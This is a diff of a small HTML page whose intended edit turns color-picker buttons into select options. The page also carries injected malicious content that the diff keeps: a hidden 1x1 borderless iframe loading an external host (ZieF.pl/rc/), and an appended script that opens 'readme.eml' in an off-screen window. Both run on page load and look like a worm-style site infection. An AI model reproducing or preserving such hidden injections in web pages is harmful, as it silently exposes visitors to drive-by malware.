@@ -4,9 +4,9 @@
         <title>My Website</title>
         <script>
             document.addEventListener('DOMContentLoaded',function(){
-                document.querySelectorAll('.color-change').forEach(function(button){
-                    button.onclick = function(){
-                        document.querySelector('#hello').style.color = button.dataset.color;
+                document.querySelectorAll('.color-change').forEach(function(option){
+                    option.onclick = function(){
+                        document.querySelector('#hello').style.color = option.dataset.color;
                     };
                 });
             });
@@ -15,12 +15,11 @@
     <body>
         <h1 id="hello">Hello!Welcome to Our PreIntern Group.</h1>
         <select>
-        <option><button class="color-change" data-color="black">Black</button></option>
-        <option><button class="color-change" data-color="red">Red</button></option>
-        <option><button class="color-change" data-color="green">Green</button></option>
-        <option><button class="color-change" data-color="blue">Blue</button></option>
-    </select>
-        <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+        <option class="color-change" data-color="red">Red</option>
+        <option class="color-change" data-color="green">Green</option>
+        <option class="color-change" data-color="blue">Blue</option>
+        </select>
+    <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
 </body>
 </html>
 <html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>
